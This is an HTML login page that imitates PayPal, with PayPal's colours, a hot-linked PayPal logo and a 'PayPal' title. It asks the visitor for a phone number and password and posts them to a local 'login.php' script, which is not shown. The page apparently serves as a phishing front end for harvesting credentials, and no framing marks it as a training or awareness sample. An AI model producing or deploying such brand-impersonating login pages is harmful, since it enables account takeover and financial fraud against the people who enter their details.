<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #003087;
            color: #001C48;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        .main {
            background-color: #ffffff;
            width: 300px;
            margin: 50px auto;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
        }
        img {
            margin-bottom: 10px;
        }
        input {
            width: 90%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #0070BA;
            border-radius: 5px;
        }
        button {
            background-color: #0070BA;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
        }
        button:hover {
            background-color: #005EA6;
        }
        a {
            color: #0070BA;
            font-weight: bold;
        }
    </style>
</head>
<body>



    <div class="main">
        <h1>PayPal</h1>
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Paypal_2014_logo.png" alt="PayPal" width="150">
        <h3>Enter your login credentials</h3>

        <form action="login.php" method="POST">

            <label for="first">Phone Number:</label>
            <input type="tel" id="first" name="first" placeholder="Enter your Mobile Number" required>
            
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" placeholder="Enter your Password" required>
            
            <button type="submit">Submit</button>
        </form>
        
        <p>Not registered? <a href="TEST.html#register">Create an account</a></p>
    </div>  
</body>
</html>
